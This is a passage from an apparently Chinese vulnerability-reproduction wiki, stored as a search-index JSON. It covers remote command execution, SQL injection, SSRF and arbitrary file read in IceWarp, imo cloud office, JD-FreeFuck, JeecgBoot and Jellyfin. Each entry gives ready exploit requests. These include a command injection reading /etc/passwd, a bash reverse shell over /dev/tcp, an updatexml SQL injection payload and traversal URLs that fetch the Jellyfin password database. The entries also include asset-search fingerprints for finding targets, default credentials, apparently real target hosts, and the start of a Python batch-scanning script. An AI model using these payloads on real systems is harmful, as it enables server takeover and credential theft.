","date":"0001-01-01","objectID":"/icewarp-webclient-basic-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/icewarp-webclient-basic-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面如下 漏洞请求包为 POST /webmail/basic/ HTTP/1.1 Host: sd.sahadharawat.com Content-Type: application/x-www-form-urlencoded Cookie: use_cookies=1 Content-Length: 43 _dlg[captcha][target]=system(\\'ipconfig\\')\\ ","date":"0001-01-01","objectID":"/icewarp-webclient-basic-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/icewarp-webclient-basic-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"imo 云办公室 corpfile.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-corpfile.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-corpfile.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 imo 云办公室 corpfile.php 文件中参数过滤不足，导致可以随意进行命令拼接，获取服务器权限 ","date":"0001-01-01","objectID":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-corpfile.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-corpfile.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 imo 云办公室 ","date":"0001-01-01","objectID":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-corpfile.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-corpfile.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"iMO-云办公室\" ","date":"0001-01-01","objectID":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-corpfile.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-corpfile.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 漏洞文件 corpfile.php \u003c?php define('DELETE_FAILED', '数据不存在，删除失败!'); define('DELETE_SUCCESS', '数据存在，删除成功!'); switch($_POST['type']) { case 'corpLogo': $checkFile = exec('ls ' . $_POST['file']); $result = exec($_POST['command']); echo json_encode(array('cid' =\u003e $_POST['cid'], 'account' =\u003e $_POST['account'], 'command' =\u003e $_POST['command'], 'file' =\u003e (($checkFile \u0026\u0026 !$result) ? DELETE_SUCCESS : DELETE_FAILED))); break; case 'userLogo': $checkFile = exec('ls ' . $_POST['file']); $result = exec($_POST['command']); echo json_encode(array('uid' =\u003e $_POST['uid'], 'user_account' =\u003e $_POST['user_account'], 'command' =\u003e $_POST['command'], 'file' =\u003e (($checkFile \u0026\u0026 !$result) ? DELETE_SUCCESS : DELETE_FAILED))); break; case 'corpTemp': $checkFile = exec('ls ' . $_POST['file']); $result = exec($_POST['command']); echo json_encode(array('cid' =\u003e $_POST['cid'], 'account' =\u003e $_POST['account'], 'command' =\u003e $_POST['command'], 'file' =\u003e (($checkFile \u0026\u0026 !$result) ? DELETE_SUCCESS : DELETE_FAILED))); break; case 'chatLog': $checkFile = exec('ls ' . $_POST['file']); $result = exec($_POST['command']); echo json_encode(array('cid' =\u003e $_POST['cid'], 'account' =\u003e $_POST['account'], 'command' =\u003e $_POST['command'], 'file' =\u003e (($checkFile \u0026\u0026 !$result) ? DELETE_SUCCESS : DELETE_FAILED))); break; case 'multiChatLog': $checkFile = exec('ls ' . $_POST['file']); $result = exec($_POST['command']); echo json_encode(array('cid' =\u003e $_POST['cid'], 'account' =\u003e $_POST['account'], 'command' =\u003e $_POST['command'], 'file' =\u003e (($checkFile \u0026\u0026 !$result) ? DELETE_SUCCESS : DELETE_FAILED))); break; case 'groupChatLog': $checkFile = exec('ls ' . $_POST['file']); $result = exec($_POST['command']); echo json_encode(array('cid' =\u003e $_POST['cid'], 'account' =\u003e $_POST['account'], 'command' =\u003e $_POST['command'], 'file' =\u003e (($checkFile \u0026\u0026 !$result) ? DELETE_SUCCESS : DELETE_FAILED))); break; case 'backChatLog': $checkFile = exec('ls ' . $_POST['file']); $result = exec($_POST['command']); echo json_encode(array('cid' =\u003e $_POST['cid'], 'account' =\u003e $_POST['account'], 'command' =\u003e $_POST['command'], 'file' =\u003e (($checkFile \u0026\u0026 !$result) ? DELETE_SUCCESS : DELETE_FAILED))); break; } 验证POC POST /corpfile.php type=corpLogo\u0026command=id\u0026file=;pwd\u003e1.txt ","date":"0001-01-01","objectID":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-corpfile.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-corpfile.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"imo 云办公室 get_file.php 远程命令执行漏洞 ","date":"0001-01-01","objectID":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-get_file.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-get_file.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 imo 云办公室 /file/NDisk/get_file.php 过滤不严格导致允许无限制地上传文件，攻击者可以通过该漏洞直接获取网站权限。 ","date":"0001-01-01","objectID":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-get_file.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-get_file.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 imo 云办公室 ","date":"0001-01-01","objectID":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-get_file.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-get_file.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"iMO-云办公室\" ","date":"0001-01-01","objectID":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-get_file.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-get_file.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 漏洞文件 get_file.php \u003c?php // 放置在 mfs 服务器上用于获取文件列表，配合 nd_verify_large_file.php 使用 if(empty($_GET['cid']) || empty($_GET['nid'])) exit; $cid = $_GET['cid']; $nid = $_GET['nid']; $mainDir = dirname(__FILE__) . '/../upload/NDiskData/normal/' . $cid . '/'; exec(\"ls {$mainDir}*_{$nid}_*\", $r); $ret = array(); foreach($r as $v) $ret[md5_file($v)] = str_replace(dirname(__FILE__) . \"/../upload/NDiskData/normal/{$cid}/\", '', $v); echo json_encode($ret); 验证POC /file/NDisk/get_file.php?cid=1\u0026nid=;pwd; ","date":"0001-01-01","objectID":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-get_file.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-get_file.php-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"imo 云办公室 Imo_DownLoadUI.php 任意文件下载漏洞 ","date":"0001-01-01","objectID":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-imo_downloadui.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-imo_downloadui.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 imo 云办公室 由于 /file/Placard/upload/Imo_DownLoadUI.php 页面 filename 参数过滤不严，导致可以读取系统敏感文件。 ","date":"0001-01-01","objectID":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-imo_downloadui.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-imo_downloadui.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 imo 云办公室 ","date":"0001-01-01","objectID":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-imo_downloadui.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-imo_downloadui.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 app=\"iMO-云办公室\" ","date":"0001-01-01","objectID":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-imo_downloadui.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-imo_downloadui.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 登录页面 验证POC /file/Placard/upload/Imo_DownLoadUI.php?cid=1\u0026uid=1\u0026type=1\u0026filename=/OpenPlatform/config/kdBind.php ","date":"0001-01-01","objectID":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-imo_downloadui.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/imo-%E4%BA%91%E5%8A%9E%E5%85%AC%E5%AE%A4-imo_downloadui.php-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8B%E8%BD%BD%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"JD-FreeFuck 后台命令执行漏洞 ","date":"0001-01-01","objectID":"/jd-freefuck-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":null,"title":"","uri":"/jd-freefuck-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞描述 JD-FreeFuck 存在后台命令执行漏洞，由于传参执行命令时没有对内容过滤，导致可以执行任意命令，控制服务器 项目地址： https://github.com/meselson/JD-FreeFuck ","date":"0001-01-01","objectID":"/jd-freefuck-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":null,"title":"","uri":"/jd-freefuck-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞影响 JD-FreeFuck ","date":"0001-01-01","objectID":"/jd-freefuck-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":null,"title":"","uri":"/jd-freefuck-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"网络测绘 title=\"京东薅羊毛控制面板\" ","date":"0001-01-01","objectID":"/jd-freefuck-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":null,"title":"","uri":"/jd-freefuck-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"漏洞复现 访问后登录页面如下 默认账号密码为 useradmin/supermanito 发送如下请求包执行命令 POST /runCmd HTTP/1.1 Host: 101.200.189.251:5678 Content-Length: 50 Pragma: no-cache Cache-Control: no-cache Accept: */* X-Requested-With: XMLHttpRequest User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.90 Safari/537.36 Content-Type: application/x-www-form-urlencoded; charset=UTF-8 Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: connect.0.6356777726800276=s%3Av1W6DxlSqnPpVgvMCItxElFeKI1Psh4i.eE4ORs0Yz30N0TOg1pUVpOqrpIHyrqIimuXJVO8lE7U Connection: close cmd=bash+jd.sh+%3Bcat /etc/passwd%3B+now\u0026delay=500 其中 cmd 参数存在命令注入 反弹shell cmd=bash+jd.sh+%3Bbash+-c+'exec+bash+-i+%26%3E%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F9999+%3C%261'%3B+now\u0026delay=500 ","date":"0001-01-01","objectID":"/jd-freefuck-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:4:0","tags":null,"title":"","uri":"/jd-freefuck-%E5%90%8E%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":null,"content":"JeecgBoot 企业级低代码平台 qurestSql SQL注入漏洞 CVE-2023-1454 ","date":"0001-01-01","objectID":"/jeecgboot-%E4%BC%81%E4%B8%9A%E7%BA%A7%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0-qurestsql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-1454/:0:0","tags":null,"title":"","uri":"/jeecgboot-%E4%BC%81%E4%B8%9A%E7%BA%A7%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0-qurestsql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-1454/"},{"categories":null,"content":"漏洞描述 JeecgBoot 企业级低代码平台 qurestSql接口存在 SQL注入漏洞，攻击者通过漏洞可以获取服务器数据库中的敏感数据，进一步攻击 ","date":"0001-01-01","objectID":"/jeecgboot-%E4%BC%81%E4%B8%9A%E7%BA%A7%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0-qurestsql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-1454/:1:0","tags":null,"title":"","uri":"/jeecgboot-%E4%BC%81%E4%B8%9A%E7%BA%A7%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0-qurestsql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-1454/"},{"categories":null,"content":"漏洞影响 JeecgBoot 企业级低代码平台 ","date":"0001-01-01","objectID":"/jeecgboot-%E4%BC%81%E4%B8%9A%E7%BA%A7%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0-qurestsql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-1454/:2:0","tags":null,"title":"","uri":"/jeecgboot-%E4%BC%81%E4%B8%9A%E7%BA%A7%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0-qurestsql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-1454/"},{"categories":null,"content":"网络测绘 app=\"JeecgBoot-企业级低代码平台\" ","date":"0001-01-01","objectID":"/jeecgboot-%E4%BC%81%E4%B8%9A%E7%BA%A7%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0-qurestsql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-1454/:3:0","tags":null,"title":"","uri":"/jeecgboot-%E4%BC%81%E4%B8%9A%E7%BA%A7%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0-qurestsql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-1454/"},{"categories":null,"content":"漏洞复现 登陆页面 验证POC POST /jeecg-boot/jmreport/qurestSql HTTP/1.1 Content-Type: application/json {\"apiSelectId\":\"1290104038414721025\", \"id\":\"1' or '%1%' like (updatexml(0x3a,concat(1,(select current_user)),1)) or '%%' like '\"} ","date":"0001-01-01","objectID":"/jeecgboot-%E4%BC%81%E4%B8%9A%E7%BA%A7%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0-qurestsql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-1454/:4:0","tags":null,"title":"","uri":"/jeecgboot-%E4%BC%81%E4%B8%9A%E7%BA%A7%E4%BD%8E%E4%BB%A3%E7%A0%81%E5%B9%B3%E5%8F%B0-qurestsql-sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E-cve-2023-1454/"},{"categories":null,"content":"Jellyfin RemoteImageController.cs SSRF漏洞 CVE-2021-29490 ","date":"0001-01-01","objectID":"/jellyfin-remoteimagecontroller.cs-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-29490/:0:0","tags":null,"title":"","uri":"/jellyfin-remoteimagecontroller.cs-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-29490/"},{"categories":null,"content":"漏洞描述 Jellyfin RemoteImageController.cs 文件中存在SSRF漏洞，通过构造特殊的请求，探测内网信息 ","date":"0001-01-01","objectID":"/jellyfin-remoteimagecontroller.cs-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-29490/:1:0","tags":null,"title":"","uri":"/jellyfin-remoteimagecontroller.cs-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-29490/"},{"categories":null,"content":"漏洞影响 Jellyfin \u003c 10.7.2 ","date":"0001-01-01","objectID":"/jellyfin-remoteimagecontroller.cs-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-29490/:2:0","tags":null,"title":"","uri":"/jellyfin-remoteimagecontroller.cs-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-29490/"},{"categories":null,"content":"网络测绘 app=\"Jellyfin\" ","date":"0001-01-01","objectID":"/jellyfin-remoteimagecontroller.cs-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-29490/:3:0","tags":null,"title":"","uri":"/jellyfin-remoteimagecontroller.cs-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-29490/"},{"categories":null,"content":"漏洞复现 在官方的更新文件中，查找到修改的文件 官方删除了某个方法 function getDisplayUrl(url, apiClient) { return apiClient.getUrl('Images/Remote', { imageUrl: url }); } 下载漏洞版本源码，查找该接口对应的文件 Jellyfin.Api/Controllers/RemoteImageController.cs 其中接收的参数为 imageUrl ，后续的代码片段存在SSRF漏洞 构造请求POC /Images/Remote?imageUrl=http://www.baidu.com ","date":"0001-01-01","objectID":"/jellyfin-remoteimagecontroller.cs-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-29490/:4:0","tags":null,"title":"","uri":"/jellyfin-remoteimagecontroller.cs-ssrf%E6%BC%8F%E6%B4%9E-cve-2021-29490/"},{"categories":null,"content":"Jellyfin 任意文件读取漏洞 CVE-2021-21402 ","date":"0001-01-01","objectID":"/jellyfin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-21402/:0:0","tags":null,"title":"","uri":"/jellyfin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-21402/"},{"categories":null,"content":"漏洞描述 Jellyfin是一个免费软件媒体系统。在10.7.1版之前的Jellyfin中，带有某些终结点的精心设计的请求将允许从Jellyfin服务器的文件系统中读取任意文件。当Windows用作主机OS时，此问题更为普遍。暴露于公共Internet的服务器可能会受到威胁。在版本10.7.1中已修复此问题。解决方法是，用户可以通过在文件系统上实施严格的安全权限来限制某些访问，但是建议尽快进行更新。 ","date":"0001-01-01","objectID":"/jellyfin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-21402/:1:0","tags":null,"title":"","uri":"/jellyfin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-21402/"},{"categories":null,"content":"漏洞影响 Jellyfin \u003c 10.7.1 ","date":"0001-01-01","objectID":"/jellyfin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-21402/:2:0","tags":null,"title":"","uri":"/jellyfin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-21402/"},{"categories":null,"content":"网络测绘 title='Jellyfin' || body='http://jellyfin.media' ","date":"0001-01-01","objectID":"/jellyfin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-21402/:3:0","tags":null,"title":"","uri":"/jellyfin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-21402/"},{"categories":null,"content":"漏洞复现 无论是/Audio/{Id}/hls/{segmentId}/stream.mp3和/Audio/{Id}/hls/{segmentId}/stream.aac路线允许任意文件在Windows上读取。可以{segmentId}使用Windows路径分隔符\\（对%5CURL进行编码）将路由的一部分设置为相对或绝对路径。最初，攻击者似乎只能读取以.mp3和.aac结尾的文件。但是，通过在URL路径中使用斜杠 Path.GetExtension(Request.Path)返回一个空扩展名，从而获得对结果文件路径的完全控制。的itemId，因为它没有使用也没有关系。该问题不仅限于Jellyfin文件，因为它允许从文件系统读取任何文件。 // Can't require authentication just yet due to seeing some requests come from Chrome without full query string // [Authenticated] // [1] [HttpGet(\"Audio/{itemId}/hls/{segmentId}/stream.mp3\", Name = \"GetHlsAudioSegmentLegacyMp3\")] [HttpGet(\"Audio/{itemId}/hls/{segmentId}/stream.aac\", Name = \"GetHlsAudioSegmentLegacyAac\")] //... public ActionResult GetHlsAudioSegmentLegacy([FromRoute, Required] string itemId, [FromRoute, Required] string segmentId) { // TODO: Deprecate with new iOS app var file = segmentId + Path.GetExtension(Request.Path); //[2] file = Path.Combine(_serverConfigurationManager.GetTranscodePath(), file); return FileStreamResponseHelpers.GetStaticFileResult(file, MimeTypes.GetMimeType(file)!, false, HttpContext); } 使用如下请求将会读取带有密码的数据库文件 http://xxx.xxx.xxx.xxx /Audio/anything/hls/..%5Cdata%5Cjellyfin.db/stream.mp3/ 另一处代码如下 // Can't require authentication just yet due to seeing some requests come from Chrome without full query string // [Authenticated] //[1] [HttpGet(\"Videos/{itemId}/hls/{playlistId}/{segmentId}.{segmentContainer}\")] //... public ActionResult GetHlsVideoSegmentLegacy( [FromRoute, Required] string itemId, [FromRoute, Required] string playlistId, [FromRoute, Required] string segmentId, [FromRoute, Required] string segmentContainer) { var file = segmentId + Path.GetExtension(Request.Path); //[2] var transcodeFolderPath = _serverConfigurationManager.GetTranscodePath(); file = Path.Combine(transcodeFolderPath, file); //[3] var normalizedPlaylistId = playlistId; var filePaths = _fileSystem.GetFilePaths(transcodeFolderPath); // Add . to start of segment container for future use. segmentContainer = segmentContainer.Insert(0, \".\"); string? playlistPath = null; foreach (var path in filePaths) { var pathExtension = Path.GetExtension(path); if ((string.Equals(pathExtension, segmentContainer, StringComparison.OrdinalIgnoreCase) || string.Equals(pathExtension, \".m3u8\", StringComparison.OrdinalIgnoreCase)) //[4] \u0026\u0026 path.IndexOf(normalizedPlaylistId, StringComparison.OrdinalIgnoreCase) != -1) //[5] { playlistPath = path; break; } } return playlistPath == null ? NotFound(\"Hls segment not found.\") : GetFileResult(file, playlistPath); } 该/Videos/{Id}/hls/{PlaylistId}/{SegmentId}.{SegmentContainer}路由允许在Windows上读取未经身份验证的任意文件。可以{SegmentId}.{SegmentContainer}使用Windows路径分隔符\\（对%5CURL进行编码）将路由的一部分设置为相对或绝对路径。在SegmentId从和文件扩展名Path被级联。结果file用作Path.Combine[3]的第二个参数。但是，如果第二个参数是绝对路径，则第一个参数to将Path.Combine被忽略，而得到的路径仅是绝对路径file。 POC如下，下载同样的文件 http://xxx.xxx.xxx.xxx/Videos/anything/hls/m/..%5Cdata%5Cjellyfin.db 如上为证明漏洞存在和可利用性，详情链接参考 https://securitylab.github.com/advisories/GHSL-2021-050-jellyfin/ ","date":"0001-01-01","objectID":"/jellyfin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-21402/:4:0","tags":null,"title":"","uri":"/jellyfin-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E-cve-2021-21402/"},{"categories":null,"content":"漏洞POC import requests import sys import random import re from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mVersion: Jellyfin \u003c 10.7.1 \\033[0m') print('+ \\033[36m使用格式: python3 poc.py \\033[0m') print('+ \\033[36mFile \u003e\u003e\u003e ip.txt \\033[0m') print('+------------------------------------------') def POC_1(target_url): vuln_url = target_url + \"/Audio/1/hls/..%5C..%5C..%5C..%5C..%5C..%5CWindows%5Cwin.ini/stream.mp3/\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=2) if response.status_code == 200 and \"file\" in response.text and 